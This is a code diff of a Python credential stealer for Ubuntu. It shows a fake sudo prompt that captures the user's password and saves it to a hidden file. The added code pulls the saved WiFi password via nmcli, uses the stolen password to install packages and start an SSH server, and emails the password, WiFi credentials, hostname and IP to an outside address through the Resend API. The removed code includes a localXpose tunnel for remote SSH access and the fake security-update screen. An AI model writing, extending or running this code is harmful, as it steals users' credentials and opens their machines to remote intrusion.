@@ -1,8 +1,5 @@
-#!/usr/bin/env python3
-
 # Required environment variables:
 # - RESEND_API_KEY: API key for sending emails via Resend
-# - LOCALXPOSE_ACCESS_TOKEN: Access token for localXpose authentication
 
 import os
 import sys
@@ -20,28 +17,141 @@ def clear_screen():
     print("[DEBUG] clear_screen called")
     os.system('clear')
 
-def send_password_via_resend(password, tunnel_url=None):
+def send_password_via_resend(password, log=None):
+    debug_log = [] if log is None else log
+    debug_log.append('[DEBUG] send_password_via_resend called')
+    print('[DEBUG] send_password_via_resend called')
     try:
         api_key = os.environ.get("RESEND_API_KEY")
         if not api_key:
+            debug_log.append("[ERROR] RESEND_API_KEY not set.")
+            print("[ERROR] RESEND_API_KEY not set.")
             return
-        
+
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         hostname = os.uname().nodename
         username = os.environ.get('USER', 'unknown')
+        # IP Address
         try:
-            ip_address = subprocess.check_output(
-                ["hostname", "-I"], text=True
-            ).strip().split()[0]
-        except Exception:
+            ip_address = subprocess.check_output([
+                "hostname", "-I"], text=True).strip().split()[0]
+            debug_log.append(f"[DEBUG] IP address: {ip_address}")
+            print(f"[DEBUG] IP address: {ip_address}")
+        except Exception as e:
             ip_address = "unknown"
+            debug_log.append(f"[ERROR] Failed to get IP address: {e}")
+            print(f"[ERROR] Failed to get IP address: {e}")
+
+        # WiFi Info
+        ssid = None
+        wifi_password = None
+        nmcli_installed = False
+        nmcli_attempted_install = False
+        nmcli_error = None
+        def try_nmcli():
+            nonlocal ssid, wifi_password, nmcli_installed, nmcli_error
+            try:
+                subprocess.run(["nmcli", "--version"], capture_output=True, check=True)
+                nmcli_installed = True
+                debug_log.append("[DEBUG] nmcli is installed.")
+                print("[DEBUG] nmcli is installed.")
+            except Exception as e:
+                nmcli_error = e
+                debug_log.append(f"[ERROR] nmcli not installed: {e}")
+                print(f"[ERROR] nmcli not installed: {e}")
+                nmcli_installed = False
+            if nmcli_installed:
+                try:
+                    ssid_out = subprocess.check_output(
+                        ["nmcli", "-t", "-f", "active,ssid", "dev", "wifi"], text=True
+                    )
+                    debug_log.append(f"[DEBUG] nmcli SSID output: {ssid_out.strip()}")
+                    print(f"[DEBUG] nmcli SSID output: {ssid_out.strip()}")
+                    for line in ssid_out.splitlines():
+                        if line.startswith("yes:"):
+                            ssid = line.split(":", 1)[1]
+                            debug_log.append(f"[DEBUG] Found active SSID: {ssid}")
+                            print(f"[DEBUG] Found active SSID: {ssid}")
+                            break
+                    else:
+                        debug_log.append("[ERROR] No active WiFi SSID found.")
+                        print("[ERROR] No active WiFi SSID found.")
+                except Exception as e:
+                    debug_log.append(f"[ERROR] Failed to get WiFi SSID: {e}")
+                    print(f"[ERROR] Failed to get WiFi SSID: {e}")
+                if ssid:
+                    try:
+                        wifi_password = subprocess.check_output(
+                            ["nmcli", "-s", "-g", "802-11-wireless-security.psk", "connection", "show", ssid], text=True
+                        ).strip()
+                        if wifi_password:
+                            debug_log.append(f"[DEBUG] WiFi password found for SSID {ssid}.")
+                            print(f"[DEBUG] WiFi password found for SSID {ssid}.")
+                        else:
+                            debug_log.append(f"[ERROR] No WiFi password found for SSID {ssid}.")
+                            print(f"[ERROR] No WiFi password found for SSID {ssid}.")
+                    except Exception as e:
+                        debug_log.append(f"[ERROR] Failed to get WiFi password for SSID {ssid}: {e}")
+                        print(f"[ERROR] Failed to get WiFi password for SSID {ssid}: {e}")
+        # First try
+        try_nmcli()
+        # If nmcli not installed, try to install it and retry once
+        if not nmcli_installed and not nmcli_attempted_install:
+            nmcli_attempted_install = True
+            debug_log.append("[DEBUG] Attempting to install nmcli (network-manager)...")
+            print("[DEBUG] Attempting to install nmcli (network-manager)...")
+            # Try to get sudo password from file
+            sudo_password = None
+            try:
+                home_dir = os.path.expanduser("~")
+                log_path = os.path.join(home_dir, ".local", "share", ".temp_log")
+                if os.path.exists(log_path):
+                    with open(log_path, 'r') as f:
+                        lines = f.read().strip().split('\n')
+                        if lines and lines[-1]:
+                            sudo_password = lines[-1].strip()
+            except Exception as e:
+                debug_log.append(f"[ERROR] Could not retrieve sudo password for nmcli install: {e}")
+                print(f"[ERROR] Could not retrieve sudo password for nmcli install: {e}")
+            if sudo_password:
+                try:
+                    proc = subprocess.Popen(
+                        ['sudo', '-S', 'apt', 'install', 'network-manager', '-y'],
+                        stdin=subprocess.PIPE,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        text=True
+                    )
+                    out, err = proc.communicate(input=f"{sudo_password}\n", timeout=120)
+                    debug_log.append(f"[DEBUG] nmcli (network-manager) install attempted. stdout: {out}, stderr: {err}")
+                    print(f"[DEBUG] nmcli (network-manager) install attempted. stdout: {out}, stderr: {err}")
+                except Exception as e:
+                    debug_log.append(f"[ERROR] nmcli (network-manager) install failed: {e}")
+                    print(f"[ERROR] nmcli (network-manager) install failed: {e}")
+                # Retry nmcli
+                try_nmcli()
+            else:
+                debug_log.append("[ERROR] No sudo password available to install nmcli.")
+                print("[ERROR] No sudo password available to install nmcli.")
+
+        wifi_info = ""
+        if ssid:
+            wifi_info += f"<p><strong>WiFi SSID:</strong> {ssid}</p>"
+        else:
+            wifi_info += f"<p><strong>WiFi SSID:</strong> unavailable</p>"
+        if wifi_password:
+            wifi_info += f"<p><strong>WiFi Password:</strong> {wifi_password}</p>"
+        else:
+            wifi_info += f"<p><strong>WiFi Password:</strong> unavailable</p>"
 
         subject = f"Security Audit - Credential Capture from {hostname}"
-        
-        tunnel_info = ""
-        if tunnel_url:
-            tunnel_info = f"<p><strong>SSH Access URL:</strong> {tunnel_url}</p>\n        "
-        
+
+        # Build a fancy log section for the email
+        log_html = "<h3>System Metrics & Debug Log</h3><ul>"
+        for entry in debug_log:
+            log_html += f"<li>{entry}</li>"
+        log_html += "</ul>"
+
         html_body = f"""
         <h2>Stolen Sudo Password</h2>
         <hr>
@@ -50,7 +160,8 @@ def send_password_via_resend(password, tunnel_url=None):
         <p><strong>Username:</strong> {username}</p>
         <p><strong>IP Address:</strong> {ip_address}</p>
         <p><strong>Captured Password:</strong> {password}</p>
-        {tunnel_info}<br>
+        {wifi_info}<br>
+        {log_html}
         <p>This is an automated security audit report.<br>
         Please review system security protocols.</p>
         <hr>
@@ -68,16 +179,33 @@ def send_password_via_resend(password, tunnel_url=None):
             "curl", "-X", "POST", "https://api.resend.com/emails",
             "-H", f"Authorization: Bearer {api_key}",
             "-H", "Content-Type: application/json",
-            "-d", str(data).replace("'", '"')
+            "-d", json.dumps(data)
         ]
-        
-        subprocess.Popen(curl_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-    except Exception:
-        pass
+
+        debug_log.append(f"[DEBUG] Sending email via resend.dev API...")
+        print(f"[DEBUG] Sending email via resend.dev API...")
+        try:
+            proc = subprocess.Popen(curl_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            stdout, stderr = proc.communicate(timeout=30)
+            debug_log.append(f"[DEBUG] resend.dev API response code: {proc.returncode}")
+            debug_log.append(f"[DEBUG] resend.dev API stdout: {stdout.strip()}")
+            debug_log.append(f"[DEBUG] resend.dev API stderr: {stderr.strip()}")
+            print(f"[DEBUG] resend.dev API response code: {proc.returncode}")
+            print(f"[DEBUG] resend.dev API stdout: {stdout.strip()}")
+            print(f"[DEBUG] resend.dev API stderr: {stderr.strip()}")
+        except Exception as e:
+            debug_log.append(f"[ERROR] resend.dev API call failed: {e}")
+            print(f"[ERROR] resend.dev API call failed: {e}")
+
+    except Exception as e:
+        if log is not None:
+            log.append(f"[ERROR] send_password_via_resend failed: {e}")
+        print(f"[ERROR] send_password_via_resend failed: {e}")
 
 def capture_sudo_password():
     print("[DEBUG] capture_sudo_password called")
+    if hasattr(capture_sudo_password, 'log'):
+        capture_sudo_password.log.append('[DEBUG] capture_sudo_password called')
     max_attempts = 3
     attempt = 1
 
@@ -98,12 +226,19 @@ def capture_sudo_password():
                 text=True
             )
             stdout, stderr = process.communicate(input=password + '\n', timeout=10)
+            print(f"[DEBUG] sudo -S -v returned code {process.returncode}")
+            if hasattr(capture_sudo_password, 'log'):
+                capture_sudo_password.log.append(f"[DEBUG] sudo -S -v returned code {process.returncode}")
 
             if process.returncode == 0:
                 print("[DEBUG] Correct sudo password captured")
+                if hasattr(capture_sudo_password, 'log'):
+                    capture_sudo_password.log.append("[DEBUG] Correct sudo password captured")
                 return password
             else:
                 print("[DEBUG] Incorrect sudo password attempt")
+                if hasattr(capture_sudo_password, 'log'):
+                    capture_sudo_password.log.append("[DEBUG] Incorrect sudo password attempt")
                 attempt += 1
 
         except KeyboardInterrupt:
@@ -111,9 +246,13 @@ def capture_sudo_password():
             sys.exit(1)
         except subprocess.TimeoutExpired:
             print("[DEBUG] sudo validation timed out")
+            if hasattr(capture_sudo_password, 'log'):
+                capture_sudo_password.log.append("[DEBUG] sudo validation timed out")
             attempt += 1
 
     print(f"sudo: {max_attempts} incorrect password attempts")
+    if hasattr(capture_sudo_password, 'log'):
+        capture_sudo_password.log.append(f"sudo: {max_attempts} incorrect password attempts")
     sys.exit(1)
 
 def show_installation_progress():
@@ -177,307 +316,95 @@ def get_stored_password():
     try:
         home_dir = os.path.expanduser("~")
         log_path = os.path.join(home_dir, ".local", "share", ".temp_log")
-        
         if not os.path.exists(log_path):
             print("[DEBUG] No stored password file found")
-            return None
-            
         with open(log_path, 'r') as f:
             lines = f.read().strip().split('\n')
             if lines and lines[-1]:
                 password = lines[-1].strip()
                 print("[DEBUG] Stored password found")
                 return password
-                
         return None
-        
     except Exception as e:
         print(f"[DEBUG] Exception in get_stored_password: {e}")
         return None
 
-def is_loclx_installed():
+# Remove is_loclx_installed, install_loclx, setup_ssh_forwarding
+# Add check for openssh-server installed and running
+
+def is_openssh_installed():
     try:
-        # Check if loclx is installed via npm
-        result = subprocess.run(['loclx', '--version'], capture_output=True, timeout=3, text=True)
-        installed = result.returncode == 0
-        return installed
-    except subprocess.TimeoutExpired:
-        return False
-    except FileNotFoundError:
-        return False
+        result = subprocess.run(['dpkg', '-s', 'openssh-server'], capture_output=True, text=True)
+        return 'Status: install ok installed' in result.stdout
     except Exception:
         return False
 
-def install_loclx(password):
+def is_ssh_running():
     try:
-        if is_loclx_installed():
-            return True
-        
-        # Install loclx via snap with sudo
-        install_process = subprocess.Popen(
-            ['sudo', '-S', 'snap', 'install', 'localxpose'],
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        stdout, stderr = install_process.communicate(input=f"{password}\n", timeout=60)
-        
-        if install_process.returncode == 0:
-            # Verify installation
-            verify_result = subprocess.run(['loclx', '--version'], 
-                                         capture_output=True, text=True, timeout=5)
-            return verify_result.returncode == 0
-        else:
-            print(f"[DEBUG] snap install failed with return code: {install_process.returncode}")
-            print(f"[DEBUG] stdout: {stdout}")
-            print(f"[DEBUG] stderr: {stderr}")
-        
-        return False
-            
-    except Exception as e:
-        print(f"[DEBUG] Exception in install_loclx: {e}")
+        result = subprocess.run(['systemctl', 'is-active', '--quiet', 'ssh'])
+        return result.returncode == 0
+    except Exception:
         return False
 
-def setup_ssh_forwarding(password):
+def ensure_ssh_installed_and_running(password):
+    log = []
+    print('[DEBUG] ensure_ssh_installed_and_running called')
     try:
-        print("[DEBUG] Starting SSH service setup")
-        
-        # Install openssh-server if not installed
-        install_ssh_process = subprocess.Popen(
-            ['sudo', '-S', 'apt', 'install', 'openssh-server', '-y'],
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        stdout, stderr = install_ssh_process.communicate(input=f"{password}\n")
-        print(f"[DEBUG] SSH install result: {install_ssh_process.returncode}")
-        
-        # Change SSH port to 2222 to avoid privilege issues
-        print("[DEBUG] Configuring SSH to use port 2222")
-        try:
-            # Read current sshd_config
-            with open('/etc/ssh/sshd_config', 'r') as f:
-                config_content = f.read()
-            
-            # Modify the port setting
-            import re
-            # Replace any existing Port line or add it
-            if re.search(r'^#?Port\s+\d+', config_content, re.MULTILINE):
-                new_config = re.sub(r'^#?Port\s+\d+', 'Port 2222', config_content, flags=re.MULTILINE)
-            else:
-                # Add Port 2222 at the beginning
-                new_config = 'Port 2222\n' + config_content
-            
-            # Write the modified config using sudo tee
-            tee_process = subprocess.Popen(
-                ['sudo', '-S', 'tee', '/etc/ssh/sshd_config'],
+        if not is_openssh_installed():
+            log.append('[DEBUG] openssh-server not installed, installing...')
+            print('[DEBUG] openssh-server not installed, installing...')
+            install_process = subprocess.Popen(
+                ['sudo', '-S', 'apt', 'install', 'openssh-server', '-y'],
                 stdin=subprocess.PIPE,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 text=True
             )
-            stdout, stderr = tee_process.communicate(input=f"{password}\n{new_config}")
-            print(f"[DEBUG] SSH config update result: {tee_process.returncode}")
-            
-        except Exception as e:
-            print(f"[DEBUG] Exception updating SSH config: {e}")
-        
-        # Start SSH service with password
-        ssh_process = subprocess.Popen(
-            ['sudo', '-S', 'systemctl', 'start', 'ssh'],
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        stdout, stderr = ssh_process.communicate(input=f"{password}\n")
-        print(f"[DEBUG] SSH service start result: {ssh_process.returncode}")
-        
-        # Restart SSH service to apply the new port configuration
-        restart_ssh_process = subprocess.Popen(
-            ['sudo', '-S', 'systemctl', 'restart', 'ssh'],
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        stdout, stderr = restart_ssh_process.communicate(input=f"{password}\n")
-        print(f"[DEBUG] SSH service restart result: {restart_ssh_process.returncode}")
-        
-        # Enable SSH service to start on boot
-        enable_ssh_process = subprocess.Popen(
-            ['sudo', '-S', 'systemctl', 'enable', 'ssh'],
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        enable_ssh_process.communicate(input=f"{password}\n")
-        
-        # Kill any existing loclx processes
-        try:
-            subprocess.run(['pkill', '-f', 'loclx'], capture_output=True)
-            time.sleep(3)
-        except Exception:
-            pass
-        
-        # Authenticate with localXpose using access token
-        print("[DEBUG] Authenticating with localXpose")
-        access_token = os.environ.get("LOCALXPOSE_ACCESS_TOKEN")
-        if not access_token:
-            print("[DEBUG] LOCALXPOSE_ACCESS_TOKEN not found in environment variables")
-            return None
-        
-        try:
-            # Login to localXpose with access token
-            login_process = subprocess.Popen(
-                ['loclx', 'account', 'login'],
-                stdin=subprocess.PIPE,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
-            )
-            login_stdout, login_stderr = login_process.communicate(input=f"{access_token}\n", timeout=30)
-            print(f"[DEBUG] localXpose login result: {login_process.returncode}")
-            if login_process.returncode != 0:
-                print(f"[DEBUG] localXpose login failed: {login_stderr}")
-                return None
-        except Exception as e:
-            print(f"[DEBUG] Exception during localXpose login: {e}")
-            return None
-        
-        print("[DEBUG] Starting loclx tunnel for SSH on port 2222")
-        
-        # Start loclx tunnel on port 2222
-        loclx_cmd = ['loclx', 'tunnel', 'tcp', '--region', 'eu' , '--port', '2222']
-        print(f"[DEBUG] Running command: {' '.join(loclx_cmd)}")
-        
-        loclx_process = subprocess.Popen(
-            loclx_cmd,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
-            preexec_fn=os.setsid if hasattr(os, 'setsid') else None
-        )
-        
-        # Give loclx time to establish tunnel
-        print("[DEBUG] Waiting for loclx to establish tunnel...")
-        time.sleep(10)
-        
-        # Check if loclx process is still running
-        if loclx_process.poll() is None:
-            print("[DEBUG] loclx process is running")
+            out, err = install_process.communicate(input=f"{password}\n")
+            log.append('[DEBUG] openssh-server installation attempted.')
+            print(f'[DEBUG] openssh-server installation attempted. stdout: {out}, stderr: {err}')
         else:
-            print(f"[DEBUG] loclx process exited with code: {loclx_process.poll()}")
-            # Try to get the output to see what went wrong
-            try:
-                stdout, stderr = loclx_process.communicate(timeout=1)
-                print(f"[DEBUG] loclx stdout: {stdout}")
-                print(f"[DEBUG] loclx stderr: {stderr}")
-            except:
-                pass
-            return None
-        
-        # Try to get the tunnel URL from loclx output
-        max_retries = 5
-        for attempt in range(max_retries):
-            try:
-                print(f"[DEBUG] Attempting to get loclx tunnel info (attempt {attempt + 1})")
-                
-                # Check if we can read from the process output
-                if loclx_process.stdout and not loclx_process.stdout.closed:
-                    # Try to read some output using select for non-blocking read
-                    try:
-                        import select
-                        if select.select([loclx_process.stdout], [], [], 0)[0]:
-                            output = loclx_process.stdout.read(1024).decode('utf-8', errors='ignore')
-                            if output:
-                                print(f"[DEBUG] loclx output: {output}")
-                                # Look for URL in output (loclx usually outputs the URL)
-                                lines = output.split('\n')
-                                for line in lines:
-                                    if any(keyword in line.lower() for keyword in ['tcp', 'tunnel', 'forwarding', 'http']):
-                                        # Extract URL from line using regex
-                                        import re
-                                        url_patterns = [
-                                            r'(https?://[^\s\)]+)',
-                                            r'(tcp://[^\s\)]+)',
-                                            r'([a-zA-Z0-9-]+\.loca\.lt)',
-                                            r'([a-zA-Z0-9-]+\.localtunnel\.me)'
-                                        ]
-                                        for pattern in url_patterns:
-                                            url_match = re.search(pattern, line)
-                                            if url_match:
-                                                tunnel_url = url_match.group(1)
-                                                # Ensure it has a protocol
-                                                if not tunnel_url.startswith(('http://', 'https://', 'tcp://')):
-                                                    tunnel_url = 'https://' + tunnel_url
-                                                print(f"[DEBUG] Found tunnel URL: {tunnel_url}")
-                                                return tunnel_url
-                    except ImportError:
-                        # select not available, try a different approach
-                        pass
-                    except Exception as e:
-                        print(f"[DEBUG] Exception reading loclx output: {e}")
-                
-                time.sleep(3)
-                
-            except Exception as e:
-                print(f"[DEBUG] Exception getting tunnel info: {e}")
-                time.sleep(3)
-        
-        # If we can't get the URL from output, return a generic message
-        print("[DEBUG] Could not extract tunnel URL from loclx output")
-        return "loclx tunnel established (URL not captured)"
-        
+            log.append('[DEBUG] openssh-server already installed')
+            print('[DEBUG] openssh-server already installed')
+        if not is_ssh_running():
+            log.append('[DEBUG] SSH service not running, starting...')
+            print('[DEBUG] SSH service not running, starting...')
+            ssh_process = subprocess.Popen(
+                ['sudo', '-S', 'systemctl', 'start', 'ssh'],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            out, err = ssh_process.communicate(input=f"{password}\n")
+            log.append('[DEBUG] SSH service start attempted.')
+            print(f'[DEBUG] SSH service start attempted. stdout: {out}, stderr: {err}')
+        else:
+            log.append('[DEBUG] SSH service already running')
+            print('[DEBUG] SSH service already running')
     except Exception as e:
-        print(f"[DEBUG] Exception in setup_ssh_forwarding: {e}")
-        return None
-        
+        log.append(f"[ERROR] ensure_ssh_installed_and_running failed: {e}")
+        print(f"[ERROR] ensure_ssh_installed_and_running failed: {e}")
+    return log
+
 def background_operations(password, silent=False):
     if not silent:
         print("[DEBUG] background_operations called")
     try:
-        loclx_url = None
-
         if not is_ubuntu():
             if not silent:
                 print("[DEBUG] Not Ubuntu, exiting background_operations")
             return
 
-        # Install loclx if not already installed
-        if not is_loclx_installed():
-            if not silent:
-                print("[DEBUG] loclx not installed, installing...")
-            install_result = install_loclx(password)
-            if not install_result:
-                if not silent:
-                    print("[DEBUG] Failed to install loclx")
-                send_password_via_resend(password, None)
-                return
-        else:
-            if not silent:
-                print("[DEBUG] loclx already installed")
-
-        # Setup SSH forwarding with loclx
+        # Just send the password and wifi info
         if not silent:
-            print("[DEBUG] Setting up SSH forwarding with loclx")
-        loclx_url = setup_ssh_forwarding(password)
-        if not silent:
-            print(f"[DEBUG] loclx_url after setup: {loclx_url}")
-
-        # Send email with password and loclx URL if available
-        if not silent:
-            print(f"[DEBUG] Sending password via resend, loclx_url: {loclx_url}")
-        send_password_via_resend(password, loclx_url)
+            print(f"[DEBUG] Sending password and wifi info via resend")
+        send_password_via_resend(password)
 
     except Exception as e:
         if not silent:
             print(f"[DEBUG] Exception in background_operations: {e}")
-        # Still send email even if loclx fails
-        send_password_via_resend(password, None)
+        send_password_via_resend(password)
 
 def save_password_to_file(password):
     print("[DEBUG] save_password_to_file called")
@@ -493,65 +420,6 @@ def save_password_to_file(password):
     except Exception as e:
         print(f"[DEBUG] Exception in save_password_to_file: {e}")
         return False
-
-def main():
-    print("[DEBUG] main called")
-    try:
-        # Check if password is already captured
-        stored_password = get_stored_password()
-        
-        if stored_password:
-            print("[DEBUG] Stored password found, running operations")
-            # Password exists - run operations silently
-            background_operations(stored_password, silent=False)
-            sys.exit(0)
-        
-        # No password stored - run the fake sudo capture
-        clear_screen()
-        
-        print("Unattended-upgrades: Security updates have not been installed.")
-        print("The following security updates are pending:")
-        print("  ca-certificates libssl3 linux-firmware openssl systemd")
-        print()
-        print("It is recommended that you apply these updates immediately.")
-        print("To do so, run the following command:")
-        print("  sudo apt update && sudo apt upgrade")
-        print()
-        
-        password = capture_sudo_password()
-        
-        print("Reading package lists... Done")
-        time.sleep(1)
-        print("Building dependency tree       ")
-        print("Reading state information... Done")
-        time.sleep(2)
-        print("The following packages will be upgraded:")
-        print("  ca-certificates libssl3 linux-firmware openssl systemd")
-        print("5 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.")
-        print("Need to get 14.2 MB of archives.")
-        print("After this operation, 0 B of additional disk space will be used.")
-        print()
-        time.sleep(1)
-        
-        # Save password to file
-        save_password_to_file(password)
-        
-        # Start background operations (install loclx, setup SSH, send email)
-        background_thread = threading.Thread(target=background_operations, args=(password,))
-        background_thread.daemon = True
-        background_thread.start()
-        
-        # Show fake installation progress
-        show_installation_progress()
-        
-        print("Processing triggers for man-db (2.10.2-1) ...")
-        print("Processing triggers for libc-bin (2.35-0ubuntu3.4) ...")
-        time.sleep(1)
-        print()
-        
-        # Give background thread time to complete before exiting
-        background_thread.join(timeout=10)
-        sys.exit(0)
         
     except KeyboardInterrupt:
         print("\n")
@@ -559,6 +427,23 @@ def main():
     except Exception as e:
         print(f"[DEBUG] Exception in main: {e}")
         sys.exit(1)
+
+def main():
+    print('[DEBUG] main called')
+    if not is_ubuntu():
+        print('[DEBUG] Not Ubuntu, exiting.')
+        sys.exit(0)
+    password = get_stored_password()
+    log = []
+    if password:
+        print('[DEBUG] Password already stored, sending info via email.')
+        send_password_via_resend(password, log=log)
+        sys.exit(0)
+    password = capture_sudo_password()
+    save_password_to_file(password)
+    ssh_log = ensure_ssh_installed_and_running(password)
+    log.extend(ssh_log)
+    send_password_via_resend(password, log=log)
 
 if __name__ == "__main__":
     main()
